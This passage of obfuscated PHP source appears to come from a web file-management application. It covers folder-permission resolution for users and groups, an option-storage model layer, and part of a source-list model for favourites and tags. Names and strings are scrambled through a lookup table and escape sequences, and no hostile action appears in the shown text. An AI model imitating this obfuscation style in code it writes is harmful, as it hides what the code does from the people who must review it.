(empty($ï´÷Ãü–[$ä÷±‚˜º[498]]) || isset($ï´÷Ãü–[$ä÷±‚˜º[2189]]) && $ï´÷Ãü–[$ä÷±‚˜º[2189]]) { return $ï´÷Ãü–; } if (AuthModel::authCheckRoot($ï´÷Ãü–[$ä÷±‚˜º[498]][$ä÷±‚˜º[499]])) { return $ï´÷Ãü–; } $Ş¥¾Ë»Ğ = Model($ä÷±‚˜º[1420])->parentLevelArray($ï´÷Ãü–[$ä÷±‚˜º[595]]); $Ş¥¾Ë»Ğ = array_merge(array($ï´÷Ãü–[$ä÷±‚˜º[193]]), array_reverse($Ş¥¾Ë»Ğ)); $ŞÎ¦õó¥ = $this->sourceAuthSelect($Ş¥¾Ë»Ğ); $¹”Äê = array(); $øå¨êŞ = array(); foreach ($ŞÎ¦õó¥ as $Òéä¦Õ => $«©êª­) { $½¨óšÊ = $this->authFolderOwnerUser($«©êª­); $¹”Äê[$Òéä¦Õ] = $½¨óšÊ; $øå¨êŞ = array_merge($øå¨êŞ, $½¨óšÊ[$ä÷±‚˜º[676]]); if ($½¨óšÊ[$ä÷±‚˜º[2190]]) { break; } } if (count($øå¨êŞ) == 0) { $øå¨êŞ = $this->authFolderOwnerGroup($ï´÷Ãü–[$ä÷±‚˜º[580]]); } $øå¨êŞ = array_unique($øå¨êŞ); if (AuthModel::authCheckRoot($ï´÷Ãü–[$ä÷±‚˜º[498]][$ä÷±‚˜º[499]])) { $øå¨êŞ[] = USER_ID; } $ï´÷Ãü–[$ä÷±‚˜º[498]][$ä÷±‚˜º[2191]] = Model($ä÷±‚˜º[588])->userListInfo($øå¨êŞ); return $ï´÷Ãü–; } private function authFolderOwnerGroup($¨‚ëĞÅÔ) { $Ãæ¡Êê =& $_SERVER[´È¥ö†ö]; $ÆÅªĞ›Ô = Model($Ãæ¡Êê[2068])->where(array($Ãæ¡Êê[1974] => $¨‚ëĞÅÔ))->select(); $€¾Ü‰‚ï = array(); if (!$ÆÅªĞ›Ô) { return $€¾Ü‰‚ï; } foreach ($ÆÅªĞ›Ô as $Ú£ì½İù) { $¹Î³ıÛÎ = $this->authInfo($Ú£ì½İù); if (AuthModel::authCheckRoot($¹Î³ıÛÎ[$Ãæ¡Êê[498]])) { $€¾Ü‰‚ï[] = $Ú£ì½İù[$Ãæ¡Êê[1773]]; } } return $€¾Ü‰‚ï; } private function authFolderOwnerUser($ëæ—åúÓ) { $É¥“«ş« =& $_SERVER[´È¥ö†ö]; $ÑÃ¦¹ı = array(); $¾®™®Ù¢ = !1; foreach ($ëæ—åúÓ as $µ§Êâ÷) { $¨íÄä–Ÿ = $this->authInfo($µ§Êâ÷); if ($µ§Êâ÷[$É¥“«ş«[580]] == $É¥“«ş«[230]) { $¾®™®Ù¢ = !0; } if ($µ§Êâ÷[$É¥“«ş«[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¨íÄä–Ÿ[$É¥“«ş«[498]])) { $ÑÃ¦¹ı[] = $µ§Êâ÷[$É¥“«ş«[580]]; } } } return array($É¥“«ş«[676] => $ÑÃ¦¹ı, $É¥“«ş«[2190] => $¾®™®Ù¢); } public function authMake($º½¾Ì­­, $©˜Ğ“Üó = false) { $Óş¹•ÏŸ =& $_SERVER[´È¥ö†ö]; $”éµå¤ª = $this->authArrayCheck($º½¾Ì­­, $©˜Ğ“Üó); if ($”éµå¤ª[$Óş¹•ÏŸ[2192]]) { $”éµå¤ª[$Óş¹•ÏŸ[2192]] = $this->sourceAuthInfo($”éµå¤ª[$Óş¹•ÏŸ[2192]]); } return $”éµå¤ª; } public function authArrayCheck($—á¢†ğ±, $½šì Øó = false) { $Ú€ÅóäÈ =& $_SERVER[´È¥ö†ö]; if (!$—á¢†ğ±) { return array($Ú€ÅóäÈ[499] => 0, $Ú€ÅóäÈ[551] => !1); } $½šì Øó = $½šì Øó ? $½šì Øó : USER_ID; $– ¼¬…ğ = 0; $”Çë—æŸ = 0; $ŸŞ’à¯› = 0; $µÇ‡ÀÄê = 0; $…ï€›¾€ = 0; $äùÖß§ = 0; $‚‰½Şô‰ = 1000; $˜µ†üñÁ = 0; $åÆ¾Êü‘ = 0; $§’İÌËö = 0; $‹ä¶·„Ú = 0; $ŒÛì¤âŠ = array($Ú€ÅóäÈ[193] => 0); foreach ($—á¢†ğ± as $ŒÛì¤âŠ) { $ÓÇ¯§Èë = $this->authInfo($ŒÛì¤âŠ); if (!$ÓÇ¯§Èë) { continue; } $ÉéµÀ¥ = $ŒÛì¤âŠ[$Ú€ÅóäÈ[580]]; $Ÿ¿†øÃ¬ = intval($ÓÇ¯§Èë[$Ú€ÅóäÈ[498]]); if ($ŒÛì¤âŠ[$Ú€ÅóäÈ[190]] == SourceModel::TYPE_USER && $ÉéµÀ¥ == $½šì Øó) { $– ¼¬…ğ = !0; $ŸŞ’à¯› = $ÓÇ¯§Èë; $”Çë—æŸ = $Ÿ¿†øÃ¬; } else { if ($ŒÛì¤âŠ[$Ú€ÅóäÈ[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÉéµÀ¥, $½šì Øó)) { $µÇ‡ÀÄê = !0; $İšµœªÅ = $this->groupStepToUserGroup($ÉéµÀ¥, $½šì Øó); if ($İšµœªÅ < $‚‰½Şô‰) { $‚‰½Şô‰ = $İšµœªÅ; $…ï€›¾€ = $Ÿ¿†øÃ¬; $äùÖß§ = $ÓÇ¯§Èë; $˜µ†üñÁ = $ÉéµÀ¥; } if ($İšµœªÅ == $‚‰½Şô‰ && $Ÿ¿†øÃ¬ >= $…ï€›¾€) { $…ï€›¾€ = $Ÿ¿†øÃ¬; $äùÖß§ = $ÓÇ¯§Èë; $˜µ†üñÁ = $ÉéµÀ¥; } } else { if ($ÉéµÀ¥ == $Ú€ÅóäÈ[230]) { $åÆ¾Êü‘ = !0; $‹ä¶·„Ú = $ÓÇ¯§Èë; $§’İÌËö = $Ÿ¿†øÃ¬; } } } } if ($– ¼¬…ğ) { $ú‚ãº¦õ = $”Çë—æŸ; $ÓÇ¯§Èë = $ŸŞ’à¯›; $şòÎìª£ = LNG($Ú€ÅóäÈ[2193]); } else { if ($µÇ‡ÀÄê) { $ú‚ãº¦õ = $…ï€›¾€; $ÓÇ¯§Èë = $äùÖß§; $¤“éº¹’ = Model($Ú€ÅóäÈ[596])->getInfo($˜µ†üñÁ); $şòÎìª£ = $Ú€ÅóäÈ[176] . $¤“éº¹’[$Ú€ÅóäÈ[600]] . $Ú€ÅóäÈ[2194] . LNG($Ú€ÅóäÈ[2195]); } else { if ($åÆ¾Êü‘) { $ú‚ãº¦õ = $§’İÌËö; $ÓÇ¯§Èë = $‹ä¶·„Ú; $şòÎìª£ = LNG($Ú€ÅóäÈ[2165]); } else { $ú‚ãº¦õ = 0; $ÓÇ¯§Èë = !1; $şòÎìª£ = $Ú€ÅóäÈ[12]; } } } $Ê¥¡´Åé = array($Ú€ÅóäÈ[2185] => intval($ú‚ãº¦õ), $Ú€ÅóäÈ[2168] => $ÓÇ¯§Èë, $Ú€ÅóäÈ[2186] => $şòÎìª£, $Ú€ÅóäÈ[2177] => $ŒÛì¤âŠ[$Ú€ÅóäÈ[193]]); return $Ê¥¡´Åé; } private function groupContainUser($üØê¦©•, $„½·ß• = false) { return in_array($üØê¦©•, $this->userGroupParents($„½·ß•)); } private function groupStepToUserGroup($‹ßêÜãÖ, $£ôø¾è = false) { $¸“„×— =& $_SERVER[´È¥ö†ö]; $€ÒË£©¹ = $this->userGroupList($£ôø¾è); $é¡ß¤âŠ = 1000; $Ã¤§€Ìı = $GLOBALS[$¸“„×—[6]][$¸“„×—[92]][$¸“„×—[2081]] == 1; $ÀÎ“˜Ã = $Ã¤§€Ìı ? 3 : 2; foreach ($€ÒË£©¹ as $Êõ–ßÃğ) { if ($Êõ–ßÃğ[$¸“„×—[1974]] == $‹ßêÜãÖ) { return 0; } $…»²¤’‹ = explode($¸“„×—[50], trim($Êõ–ßÃğ[$¸“„×—[595]], $¸“„×—[50])); if ($…»²¤’‹[0] == $¸“„×—[230] && count($…»²¤’‹) > $ÀÎ“˜Ã) { $Ù¢Ë÷ÑÛ = array_reverse(array_slice($…»²¤’‹, $ÀÎ“˜Ã)); $¸ñ÷™›— = array_search($‹ßêÜãÖ, $Ù¢Ë÷ÑÛ); if ($¸ñ÷™›— !== !1 && $¸ñ÷™›— + 1 <= $é¡ß¤âŠ) { $é¡ß¤âŠ = $¸ñ÷™›— + 1; } } } return $é¡ß¤âŠ; } private function userGroupList($ˆ¿£˜¬… = false) { $ÙèÀ¡ä» =& $_SERVER[´È¥ö†ö]; static $‹•ˆøú’ = array(); if (isset($‹•ˆøú’[$ˆ¿£˜¬…])) { return $‹•ˆøú’[$ˆ¿£˜¬…]; } $¡¨ÁÂö¯ = Model($ÙèÀ¡ä»[608])->getInfo($ˆ¿£˜¬…); $‹•ˆøú’[$ˆ¿£˜¬…] = array_to_keyvalue($¡¨ÁÂö¯[$ÙèÀ¡ä»[2166]], $ÙèÀ¡ä»[1974]); return $‹•ˆøú’[$ˆ¿£˜¬…]; } public function userGroupParents($˜âÛÔè­) { $Ğš•é«Ë =& $_SERVER[´È¥ö†ö]; static $Æñ¦¾çŞ = array(); $˜âÛÔè­ = $˜âÛÔè­ ? $˜âÛÔè­ : USER_ID; if (isset($Æñ¦¾çŞ[$˜âÛÔè­])) { return $Æñ¦¾çŞ[$˜âÛÔè­]; } $Ú´æìãõ = $this->userGroupList($˜âÛÔè­); $Ş¾›ÍÙÀ = array(); $ø½‡ô¦ = $GLOBALS[$Ğš•é«Ë[6]][$Ğš•é«Ë[92]][$Ğš•é«Ë[2081]] == 1; $Ñ°¤şÏè = $ø½‡ô¦ ? 3 : 2; foreach ($Ú´æìãõ as $†Õ¾ø¢ö) { $ÛàûÀ× = array($†Õ¾ø¢ö[$Ğš•é«Ë[1974]]); $—ŞÉÅşƒ = explode($Ğš•é«Ë[50], trim($†Õ¾ø¢ö[$Ğš•é«Ë[595]], $Ğš•é«Ë[50])); if ($—ŞÉÅşƒ[0] == $Ğš•é«Ë[230] && count($—ŞÉÅşƒ) > $Ñ°¤şÏè) { $Ê™É„° = array_slice($—ŞÉÅşƒ, $Ñ°¤şÏè); $ÛàûÀ× = array_merge($ÛàûÀ×, array_reverse($Ê™É„°)); } $Ş¾›ÍÙÀ = array_merge($Ş¾›ÍÙÀ, $ÛàûÀ×); } $Æñ¦¾çŞ[$˜âÛÔè­] = array_unique($Ş¾›ÍÙÀ); return $Æñ¦¾çŞ[$˜âÛÔè­]; } public function authTargetInfoMake($äô³Æ¤ë) { $ƒ•ñ¥´õ =& $_SERVER[´È¥ö†ö]; $˜÷ø­†– = array(); $«ú ä¤Ô = array(); foreach ($äô³Æ¤ë as $§Ã¡ú­¥) { if ($§Ã¡ú­¥[$ƒ•ñ¥´õ[190]] == SourceModel::TYPE_USER) { $˜÷ø­†–[] = intval($§Ã¡ú­¥[$ƒ•ñ¥´õ[580]]); } else { if ($§Ã¡ú­¥[$ƒ•ñ¥´õ[190]] == SourceModel::TYPE_GROUP) { $«ú ä¤Ô[] = intval($§Ã¡ú­¥[$ƒ•ñ¥´õ[580]]); } } } if ($˜÷ø­†–) { $˜÷ø­†– = Model($ƒ•ñ¥´õ[588])->userListInfo($˜÷ø­†–); } if ($«ú ä¤Ô) { $êíÇı‚ = array($ƒ•ñ¥´õ[2066] => array($ƒ•ñ¥´õ[503], $«ú ä¤Ô)); $«ú ä¤Ô = Model($ƒ•ñ¥´õ[596])->field($ƒ•ñ¥´õ[2196])->where($êíÇı‚)->select(); $«ú ä¤Ô = array_to_keyvalue($«ú ä¤Ô, $ƒ•ñ¥´õ[1974]); } return array($ƒ•ñ¥´õ[2197] => $˜÷ø­†–, $ƒ•ñ¥´õ[2198] => $«ú ä¤Ô); } public function authInfo($İšı¶Ğ¬) { $Êí®ß­… =& $_SERVER[´È¥ö†ö]; if ($İšı¶Ğ¬[$Êí®ß­…[2082]]) { $È°×½ƒ¿ = Model($Êí®ß­…[582])->listData($İšı¶Ğ¬[$Êí®ß­…[2082]]); if (!$È°×½ƒ¿) { return !1; $ÒÕíê‹Ã = Model($Êí®ß­…[582])->listData(); $ÄâŒùœŠ = array_filter_by_field($ÒÕíê‹Ã, $Êí®ß­…[498], $Êí®ß­…[230]); return $ÄâŒùœŠ; } $›¨æÔ’ = array_field_key($È°×½ƒ¿, array($Êí®ß­…[486], $Êí®ß­…[32], $Êí®ß­…[498], $Êí®ß­…[1997], $Êí®ß­…[1998])); $›¨æÔ’[$Êí®ß­…[2199]] = $İšı¶Ğ¬; return $›¨æÔ’; } else { return array($Êí®ß­…[504] => 0, $Êí®ß­…[1980] => $İšı¶Ğ¬[$Êí®ß­…[2143]], $Êí®ß­…[505] => $Êí®ß­…[12], $Êí®ß­…[1997] => $Êí®ß­…[2200]); } } } goto AŸ¢â•³ÚÀ; C­Õ‘ÇŠíç: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\x6d\x4f\160\164\151\x6f\x6e"; public $field = array(); public function listData($áŒ• = false, $Û®¶±ÅÅ = "\155\157\x64\x69\x66\x79\x54\x69\155\145", $Çøî´Š‘ = false) { $‰¯µ¥ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÑØğğ“è = array_values($‰¯µ¥); if ($ÑØğğ“è && $ÑØğğ“è[0] && !is_array($ÑØğğ“è[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‰¯µ¥ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‰¯µ¥) { return $áŒ• ? null : array(); } if (!$áŒ•) { $‰¯µ¥ = array_filter(array_values($‰¯µ¥)); return array_sort_by($‰¯µ¥, $Û®¶±ÅÅ, $Çøî´Š‘); } return $‰¯µ¥[$_SERVER[´È¥ö†ö][483] . $áŒ•]; } public function insert($„åúíâº) { $ÔÑÍİÆ¹ =& $_SERVER[´È¥ö†ö]; $„åúíâº = array_field_key($„åúíâº, $this->field); $¨–ë—ö = Model($this->modelType)->get($ÔÑÍİÆ¹[484], $this->optionType . $ÔÑÍİÆ¹[485]); $¨–ë—ö = $¨–ë—ö ? $¨–ë—ö : 0; $„åúíâº[$ÔÑÍİÆ¹[486]] = ++$¨–ë—ö; $„åúíâº[$ÔÑÍİÆ¹[233]] = time(); $„åúíâº[$ÔÑÍİÆ¹[88]] = time(); Model($this->modelType)->set($ÔÑÍİÆ¹[484], $¨–ë—ö, $this->optionType . $ÔÑÍİÆ¹[485]); Model($this->modelType)->set($ÔÑÍİÆ¹[483] . $¨–ë—ö, $„åúíâº, $this->optionType); return $¨–ë—ö; } public function update($´œÉÜ€å, $Â°­´Ğ) { $†ş€ïÆÖ =& $_SERVER[´È¥ö†ö]; $Â°­´Ğ = array_field_key($Â°­´Ğ, $this->field); $è–óó—© = $this->listData($´œÉÜ€å); if (!$è–óó—© || !$´œÉÜ€å) { return !1; } $Â°­´Ğ = array_merge($è–óó—©, $Â°­´Ğ); $Â°­´Ğ[$†ş€ïÆÖ[88]] = time(); return Model($this->modelType)->set($†ş€ïÆÖ[483] . $´œÉÜ€å, $Â°­´Ğ, $this->optionType); } public function remove($½»Â…€) { if (!$½»Â…€) { return !1; } return Model($this->modelType)->remove($_SERVER[´È¥ö†ö][483] . $½»Â…€, $this->optionType); } public function clear() { $Ì°¸íôä =& $_SERVER[´È¥ö†ö]; Model($this->modelType)->remove($Ì°¸íôä[484], $this->optionType . $Ì°¸íôä[485]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($‰Ğ²¹˜¯, $ãİ¿àÃ…) { if (!$ãİ¿àÃ…) { return !1; } $‚‘õ€íŞ = $this->listData(); $‚‘õ€íŞ = array_to_keyvalue($‚‘õ€íŞ, $‰Ğ²¹˜¯); return isset($‚‘õ€íŞ[$ãİ¿àÃ…]) ? $‚‘õ€íŞ[$ãİ¿àÃ…] : !1; } public function findByName($šÜë–ƒ) { return $this->findByKey($_SERVER[´È¥ö†ö][32], $šÜë–ƒ); } protected function resetData($æÏê‚„ú) { $ÕóıÏÇò =& $_SERVER[´È¥ö†ö]; $æÏê‚„ú = is_array($æÏê‚„ú) ? $æÏê‚„ú : array(); $ø¿–¹š = array(); for ($‡òøñ„¾ = 0; $‡òøñ„¾ < count($æÏê‚„ú); $‡òøñ„¾++) { $ø¿–¹š[$ÕóıÏÇò[483] . $æÏê‚„ú[$‡òøñ„¾][$ÕóıÏÇò[486]]] = $æÏê‚„ú[$‡òøñ„¾]; } return Model($this->modelType)->set($ø¿–¹š, !1, $this->optionType); } private function getAutoName($Ëœ˜í½³) { $›Îé…õî = array_to_keyvalue($this->listData(), $_SERVER[´È¥ö†ö][32]); if (!$›Îé…õî || !isset($›Îé…õî[$Ëœ˜í½³])) { return $Ëœ˜í½³; } for ($û‹Ç¦é‰ = 1; $û‹Ç¦é‰ < count($›Îé…õî); $û‹Ç¦é‰++) { $›íÓİ¿ô = $Ëœ˜í½³ . "\50{$û‹Ç¦é‰}\x29"; if (!isset($›Îé…õî[$›íÓİ¿ô])) { return $›íÓİ¿ô; } } return $›íÓİ¿ô; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($´Ó­Ê÷© = false, $’ôÇ²’” = '', $éì’ß¼µ = false) { $õÚˆî÷æ =& $_SERVER[´È¥ö†ö]; $©æ±ÃÒ“ = $this->cacheGet($’ôÇ²’”); $¡Ğ¾¿Íû = $this->optionDefault($’ôÇ²’”); $¡Ğ¾¿Íû = is_array($¡Ğ¾¿Íû) ? $¡Ğ¾¿Íû : array(); if (is_array($©æ±ÃÒ“)) { $©æ±ÃÒ“ = array_merge($¡Ğ¾¿Íû, $©æ±ÃÒ“); return $´Ó­Ê÷© ? isset($©æ±ÃÒ“[$´Ó­Ê÷©]) ? $©æ±ÃÒ“[$´Ó­Ê÷©] : null : $©æ±ÃÒ“; } $–¹êúšÒ = $this->filterWhere(array($õÚˆî÷æ[33] => $’ôÇ²’”)); $©æ±ÃÒ“ = $this->where($–¹êúšÒ)->select(); $©æ±ÃÒ“ = array_to_keyvalue($©æ±ÃÒ“, $õÚˆî÷æ[97], $õÚˆî÷æ[461]); foreach ($©æ±ÃÒ“ as $ô‰ËÈõÊ => $»Ş—ç„) { if ($éì’ß¼µ || in_array($ô‰ËÈõÊ, $this->jsonField)) { $©æ±ÃÒ“[$ô‰ËÈõÊ] = json_decode($»Ş—ç„, !0); } } $this->cacheSet($’ôÇ²’”, $©æ±ÃÒ“); $©æ±ÃÒ“ = array_merge($¡Ğ¾¿Íû, $©æ±ÃÒ“); return $´Ó­Ê÷© ? $©æ±ÃÒ“[$´Ó­Ê÷©] : $©æ±ÃÒ“; } public function set($ñÂòàĞ, $ª¼û’å¼ = false, $Î²å‡† = '') { $áÂç£ğë =& $_SERVER[´È¥ö†ö]; $this->cacheRemove($Î²å‡†); $Éâï›•ç = array(); $—óÃñ¥  = is_array($ñÂòàĞ) ? $ñÂòàĞ : array($ñÂòàĞ => $ª¼û’å¼); foreach ($—óÃñ¥  as $ØİÃ¶Š => $ä¦ş‚š) { if (is_array($ä¦ş‚š)) { $ä¦ş‚š = json_encode_force($ä¦ş‚š); } $this->checkLength($ä¦ş‚š, !1, $this->tableName . $áÂç£ğë[4] . $ñÂòàĞ); $ä¦ş‚š = self::textEncode($ä¦ş‚š); $—óÃñ¥  = array($áÂç£ğë[33] => $Î²å‡†, $áÂç£ğë[97] => $ØİÃ¶Š, $áÂç£ğë[461] => $ä¦ş‚š); $Éâï›•ç[] = $this->filterWhere($—óÃñ¥ ); } if (!$Éâï›•ç) { return !0; } $í¶üû•£ = $this->cacheKey($áÂç£ğë[487]); CacheLock::lock($í¶üû•£); $š³®ÇÔé = $this->addAll($Éâï›•ç, array(), !0); CacheLock::unlock($í¶üû•£); return $š³®ÇÔé; } protected function optionDefault($ŸšøÖûÕ = '') { return !1; } public function setDeep($¶™Í‡Ùâ, $ÏÏ×ãæ = false, $¦ÁÄ¤óÌ = '') { $£–ÜÕ = explode($_SERVER[´È¥ö†ö][10], $¶™Í‡Ùâ); $˜Ô‚íÄ = $this->get(); array_set_value($˜Ô‚íÄ, $¶™Í‡Ùâ, $ÏÏ×ãæ); $this->set($£–ÜÕ[0], $˜Ô‚íÄ[$£–ÜÕ[0]], $¦ÁÄ¤óÌ); } public function remove($ƒ©œ°õÌ, $¼›³øÇø = '') { $ÎøÚ¤æ =& $_SERVER[´È¥ö†ö]; $this->cacheRemove($¼›³øÇø); $º¶ ó† = $this->filterWhere(array($ÎøÚ¤æ[97] => $ƒ©œ°õÌ, $ÎøÚ¤æ[33] => $¼›³øÇø)); if (is_null($ƒ©œ°õÌ)) { unset($º¶ ó†[$ÎøÚ¤æ[97]]); } return $this->where($º¶ ó†)->delete(); } public function cacheSet($Íöúò•¦, $ıƒşŒ‘ = false) { return Cache::set($this->cacheKey($Íöúò•¦), $ıƒşŒ‘); } public function cacheGet($Åó³Çûş) { return Cache::get($this->cacheKey($Åó³Çûş)); } public function cacheRemove($ï“²ğÁ) { return Cache::remove($this->cacheKey($ï“²ğÁ)); } protected function filterWhere($§ÈÇ«»ô) { return $§ÈÇ«»ô; } protected function cacheKey($ì¬Ìé„) { return $ì¬Ìé„; } } class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\x63\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\151\157\137\x73\157\165\x72\143\x65\x5f\155\145\164\x61", "\x6d\x65\x74\x61\x46\x69\145\x6c\x64" => "\163\x6f\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\151\155\x65", "\164\x69\x6d\x65", "\x69\156\163\x65\x72\164", "\146\165\x6e\143\164\151\157\x6e"), array("\143\x72\145\x61\164\x65\124\151\155\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\x74", "\146\165\x6e\143\164\151\x6f\x6e"), array("\166\151\145\167\124\x69\155\145", "\164\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\x75\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ó¨úä°Á) { return $this->listSource(array($_SERVER[´È¥ö†ö][488] => $Ó¨úä°Á)); } public function typeName($‚Ä‰¸¬) { static $—ÒÙİŒ = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\x75\163\145\162", self::TYPE_GROUP => "\x67\x72\157\165\x70"); return $—ÒÙİŒ[$‚Ä‰¸¬ . $_SERVER[´È¥ö†ö][12]]; } public function sourceListInfo($äµ¿í½Å, $¾ÂÉÙû = false) { $È‹š¶Ìö =& $_SERVER[´È¥ö†ö]; $äµ¿í½Å = $äµ¿í½Å ? $äµ¿í½Å : array(); $äµ¿í½Å = array_filter(array_unique($äµ¿í½Å)); if (!$äµ¿í½Å) { return array(); } $‚¶îàÙá = $this->where(array($È‹š¶Ìö[193] => array($È‹š¶Ìö[7], $äµ¿í½Å)))->select(); $this->_listDataApply($‚¶îàÙá, $¾ÂÉÙû); return array_to_keyvalue($‚¶îàÙá, $È‹š¶Ìö[193]); } public function pathInfoFilter(&$“¨·¨„) { $“¤ÖÖÆ³ =& $_SERVER[´È¥ö†ö]; static $ÔŒşĞ¨È = false; static $©ëØõú = false; static $Ş×‚¥ñÓ = false; if (!$ÔŒşĞ¨È) { $ÄúÆÁ = $“¤ÖÖÆ³[489]; $ÄúÆÁ .= $“¤ÖÖÆ³[490]; $ÄúÆÁ .= $“¤ÖÖÆ³[491]; $…¦¹°ä = $“¤ÖÖÆ³[492]; $ÕÁÅ”ş‰ = explode($“¤ÖÖÆ³[50], $…¦¹°ä); $ÔŒşĞ¨È = explode($“¤ÖÖÆ³[50], $ÄúÆÁ); $©ëØõú = array(); foreach ($ÔŒşĞ¨È as $Üš¢ø ) { if (in_array($Üš¢ø , $ÕÁÅ”ş‰)) { continue; } $©ëØõú[] = $Üš¢ø ; } $Ş×‚¥ñÓ = explode($“¤ÖÖÆ³[50], $“¤ÖÖÆ³[493]); } foreach ($Ş×‚¥ñÓ as $›Éâ¿æà) { if (isset($“¨·¨„[$›Éâ¿æà])) { $“¨·¨„[$›Éâ¿æà] = intval($“¨·¨„[$›Éâ¿æà]); } } $“¨·¨„[$“¤ÖÖÆ³[87]] = $“¤ÖÖÆ³[494] . $“¨·¨„[$“¤ÖÖÆ³[193]] . $“¤ÖÖÆ³[495]; $“¨·¨„[$“¤ÖÖÆ³[33]] = $“¨·¨„[$“¤ÖÖÆ³[496]] == 1 ? $“¤ÖÖÆ³[78] : $“¤ÖÖÆ³[232]; $“¨·¨„[$“¤ÖÖÆ³[190]] = $this->typeName($“¨·¨„[$“¤ÖÖÆ³[190]]); if ($“¨·¨„[$“¤ÖÖÆ³[496]] != 1) { $“¨·¨„[$“¤ÖÖÆ³[169]] = $“¨·¨„[$“¤ÖÖÆ³[497]]; unset($“¨·¨„[$“¤ÖÖÆ³[497]]); } $µš¼ñ— = $ÔŒşĞ¨È; if (isset($“¨·¨„[$“¤ÖÖÆ³[498]]) && $“¨·¨„[$“¤ÖÖÆ³[498]][$“¤ÖÖÆ³[499]] == -1) { $µš¼ñ— = $©ëØõú; } $“¨·¨„ = array_field_key($“¨·¨„, $µš¼ñ—); return $“¨·¨„; } public function listUserFav() { $¿ï×Õı =& $_SERVER[´È¥ö†ö]; $ú†ú·ØÙ = Model($¿ï×Õı[500])->listData(); $Š‹–ßäº = array_filter_by_field($ú†ú·ØÙ, $¿ï×Õı[33], $¿ï×Õı[501]); $Š‹–ßäº = array_to_keyvalue($Š‹–ßäº, $¿ï×Õı[12], $¿ï×Õı[87]); if ($Š‹–ßäº) { $¢ÌÒËŞ‡ = $this->listSource(array($¿ï×Õı[502] => array($¿ï×Õı[503], $Š‹–ßäº))); } $¢ÌÒËŞ‡ = array_to_keyvalue($¢ÌÒËŞ‡[$¿ï×Õı[456]], $¿ï×Õı[193]); foreach ($ú†ú·ØÙ as &$Óüôù×¡) { $Óüôù×¡ = array($¿ï×Õı[504] => $Óüôù×¡[$¿ï×Õı[486]], $¿ï×Õı[505] => $Óüôù×¡[$¿ï×Õı[32]], $¿ï×Õı[506] => $Óüôù×¡[$¿ï×Õı[87]], $¿ï×Õı[507] => $Óüôù×¡[$¿ï×Õı[33]], $¿ï×Õı[508] => $Óüôù×¡[$¿ï×Õı[233]], $¿ï×Õı[509] => $Óüôù×¡[$¿ï×Õı[88]]); if ($Óüôù×¡[$¿ï×Õı[33]] == $¿ï×Õı[501] && $¢ÌÒËŞ‡[$Óüôù×¡[$¿ï×Õı[87]]]) { $Óüôù×¡[$¿ï×Õı[90]] = $¢ÌÒËŞ‡[$Óüôù×¡[$¿ï×Õı[87]]]; } } unset($Óüôù×¡); return $ú†ú·ØÙ; } public function listUserTag($±Ãş÷¦¤) { $½ú›¾…ã =& $_SERVER[´È¥ö†ö]; if ($±Ãş÷¦¤ && !is_array($±Ãş÷¦¤)) { $±Ãş÷¦¤ = array($±Ãş÷¦¤); } $‡ö€ƒíî = Model($½ú›¾…ã[510])->listData(); $Á†‡şõº = array(); $ÓÒÉ­«è = array(); foreach ($‡ö€ƒíî as $ØèÜ¦¯) { $´ø§ÓñŸ = $ØèÜ¦¯[$½ú›¾…ã[87]]; if (!$´ø§ÓñŸ) { continue; } if (!isset($ÓÒÉ­«è[$´ø§ÓñŸ])) { $ÓÒÉ­«è[$´ø§ÓñŸ] = array(); } $ÓÒÉ­«è[$´ø§ÓñŸ][] = $ØèÜ¦¯[$½ú›¾…ã[511]]; $Á†‡şõº[$ØèÜ¦¯[$½ú›¾…ã[87]]] = $ØèÜ¦¯; } $›ó·îƒû = array(); $åÁÏıÇÌ = array(); $ÄÌ´ç†Æ = array(); foreach ($ÓÒÉ­«è as $«Ï¯Ü†” => $Á®Á—ò¢) { $«™šÛğ² = !0; if (!$±Ãş÷¦¤) { $›ó·îƒû[] = $«Ï¯Ü†”; continue; } foreach ($±Ãş÷¦¤ as $¶‡ÄòÊ») { if (!in_array($¶‡ÄòÊ», $Á®Á—ò¢)) { $«™šÛğ² = !1; break; } } if (!$«™šÛğ²) { continue; } if (!is_numeric($«Ï¯Ü†”)) { $”¡†Ì¹… = $Á†‡şõº[$«Ï¯Ü†”]; $ùÕŠ¼À = array($½ú›¾…ã[32] => $”¡†Ì¹…[$½ú›¾…ã[32]], $½ú›¾…ã[87] => $”¡†Ì¹…[$½ú›¾…ã[87]], $½ú›¾…ã[33] => $”¡†Ì¹…[$½ú›¾…ã[33]], $½ú›¾…ã[90] => array($½ú›¾…ã[512] => 1), $½ú›¾…ã[234] => !0); if ($”¡†Ì¹…[$½ú›¾…ã[33]] == $½ú›¾…ã[232]) { $ÄÌ´ç†Æ[] = $ùÕŠ¼À; } if ($”¡†Ì¹…[$½ú›¾…ã[33]] == $½ú›¾…ã[78]) { $åÁÏıÇÌ[] = $ùÕŠ¼À; } continue; } $›ó·îƒû[] = $«Ï¯Ü†”; } if ($›ó·îƒû) { $Ûêâ¥÷³ = $this->listSource(array($½ú›¾…ã[502] => array($½ú›¾…ã[503], $›ó·îƒû))); } $Ûêâ¥÷³ = $Ûêâ¥÷³ ? $Ûêâ¥÷³ : array($½ú›¾…ã[85] => array(), $½ú›¾…ã[86] => array()); $Ûêâ¥÷³[$½ú›¾…ã[85]] = array_merge($Ûêâ¥÷³[$½ú›¾…ã[85]], $åÁÏıÇÌ); $Ûêâ¥÷³[$½ú›¾…ã[86]] = 